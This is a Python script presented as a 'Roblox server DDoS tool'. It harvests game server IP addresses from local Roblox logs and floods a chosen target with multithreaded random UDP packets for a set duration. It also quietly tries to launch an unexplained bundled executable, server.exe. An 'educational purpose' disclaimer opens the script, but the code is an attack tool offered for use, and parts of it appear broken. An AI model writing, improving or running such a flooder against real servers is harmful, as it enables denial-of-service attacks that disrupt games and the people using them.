import glob
import os
from colorama import *
import time
import ctypes
import sys
import random
import socket
import threading
import random
init()
os.system("cls")
username = os.getenv('username')



print("disclaimer of liability / i am not responsable for the actions you do, this is made purely for educational purpose!")
time.sleep(5)
os.system("cls")

try:
    input(Fore.WHITE + "[" + Fore.RED + "+" + Fore.WHITE + "]" " Press [ENTER] to start")
except SyntaxError:
    pass
list_of_files = glob.glob(r'C:\\users\\{}\\AppData\\Local\\Roblox\\logs\\*'.format(username))
latest_file = max(list_of_files, key=os.path.getctime)
roblox_log = open(latest_file, 'r',encoding="utf8")

for line in roblox_log:
    if 'Connection accepted from' in line:
        line = line.replace('Connection accepted from', '')
        line2 = line.replace('|', ':')
        line3 = line2[25:]
        print("connected to roblox server: " + line3)

        ip_history = open('server_ips.txt', 'a+',encoding="utf8")
        ip_history.write(line3 + "\n")
        ip_history.close()

targetIP = input(Fore.WHITE + "[" + Fore.RED + "+" + Fore.WHITE + "]" " input your target IP addr: ")
targetPORT = input(Fore.WHITE + "[" + Fore.RED + "+" + Fore.WHITE + "]" "input the IP PORT above: ")
threads1 = input(Fore.WHITE + "[" + Fore.RED + "+" + Fore.WHITE + "]" "how many threads? : ")
temps1 = input(Fore.WHITE + "[" + Fore.RED + "+" + Fore.WHITE + "]" "set attack duration: ")
os.system("cls")



def banner():
    print(Fore.RED + f"""
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿   -< Roblox server DDoS tool. >-
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠇⠸⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿   -< tool for educational use >-
⣿⣿⣿⣿⣿⣿⣿⡿⠟⢉⣠⣴⣶⣾⡇⢸⣷⣶⣦⣄⡉⠻⢿⣿⣿⣿⣿⣿⣿⣿   
⣿⣿⣿⣿⣿⡿⠋⣠⣶⣿⣿⣿⣿⣿⣇⣸⣿⣿⣿⣿⣿⣶⣄⠙⢿⣿⣿⣿⣿⣿   [target Locked at {targetIP}:{targetPORT}
⣿⣿⣿⣿⡟⢁⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡈⢻⣿⣿⣿⣿   [attack type / UDP                       
⣿⣿⣿⣿⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⣿⣿⣿⣿   [thread count: {threads1}                
⣿⣿⣿⡇⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⢸⣿⣿⣿   [duration: {temps1}                      
⣿⣿⣉⡁⣉⣉⣉⣹⣿⣿⣿⣿⣿⣉⡁⢈⣉⣿⣿⣿⣿⣿⣏⣉⣉⣉⢈⣉⣿⣿
⣿⣿⣿⡇⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⢸⣿⣿⣿   [note: ddos attacks require decent internet to preform
⣿⣿⣿⣿⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⣿⣿⣿⣿
⣿⣿⣿⣿⣧⡈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⢁⣼⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣷⣄⠙⠿⣿⣿⣿⣿⣿⡏⢹⣿⣿⣿⣿⣿⠿⠋⣠⣾⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣷⣦⣈⠙⠻⠿⢿⡇⢸⡿⠿⠟⠋⣁⣴⣾⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⡆⢰⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    
    """)

banner()
input(Fore.WHITE + "[" + Fore.RED + "+" + Fore.WHITE + "]" "press [ENTER] to start attack...")
    #!/usr/bin/env python3
# -*- coding: utf-8 -*-

if ctypes.windll.shell32.IsUserAnAdmin() != True:
    print(Fore.WHITE + "[" + Fore.RED + "WARNING" + Fore.WHITE + "]" "not an admin, connection rate will be slow!")
    time.sleep(5)
    os.system("cls")

print(Fore.WHITE + "[" + Fore.RED + "+" + Fore.WHITE + "]" " starting...")

cwd = os.getcwd()
try:
 os.startfile(f"{cwd}\\serv\\sv\\server.exe")
except:
 pass
def minecraftsexptdr(ip,port,temps):
    timeout = time.time() + float(temps)
    udpsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    #rawsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    sent = 0
    #taille du packet
    bytes = random._urandom(256)
    while True:
                    try:
                            if time.time() > timeout :
                                    break
                            else:
                                    pass
                            ran = random.randrange(10**80)
                            hex = "%064x" % ran
                            hex = hex[:64] 
                            udpsock.sendto(bytes.fromhex(hex) + bytes,(ip,int(port)))
                            #rawsock.sendto(bytes.fromhex(hex) + bytes,(ip,int(port))) 
                            sent = sent + 1
                            if (random.randint(0,10000)) == 1:
                             print(Back.RED + f"[{sent}]" + Back.BLACK + f" sent {sent} udp packets to {ip}:{port} ")
                            else:
                             pass
                    except KeyboardInterrupt:
                            sys.exit(os.system("clear"))



def main():
    ip = targetIP
    port = int(targetPORT)
    threads = int(threads1)
    temps = int(temps1)
    for i in range(0, threads):
        thread = threading.Thread(target=minecraftsexptdr, args=(ip,port,temps))
        thread.start()
        
if __name__ == "__main__":
    main()
    
